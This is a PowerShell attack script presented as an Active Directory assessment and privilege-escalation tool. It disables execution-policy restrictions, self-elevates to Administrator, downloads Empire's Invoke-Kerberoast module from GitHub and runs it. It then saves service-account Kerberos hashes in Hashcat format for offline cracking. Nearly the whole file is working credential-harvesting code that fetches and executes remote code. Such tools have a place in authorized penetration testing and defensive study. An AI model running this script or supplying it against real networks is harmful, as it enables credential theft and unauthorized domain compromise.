Write-Host "###########################################################################################################" -ForegroundColor Green
Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
Write-Host "##                                                                                                       ##" -ForegroundColor Green
Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
Write-Host "###########################################################################################################" -ForegroundColor Green
Set-ExecutionPolicy Unrestricted
#run as Admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
#Create capture file
$path = "C:\Capture"
"Creating the capture folder..."
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
}
$modules=split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
#specify modules folder
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
Write-Host "Using Module path: $modulepath" -ForegroundColor Green

#create kerberoast PS module folder
If(!(test-path $modulepath/Kerberoast))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
}

#download Kerberoast
Write-Host "Fetching Kerberoast module..."
$client = New-Object System.Net.WebClient
If(!($client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")))
{
	Write-Host "Attemping to fetch module from GitHub..."
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
}
#Run Kerberoast
Write-Host "Importing module..." 
Import-Module Kerberoast.psm1
Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
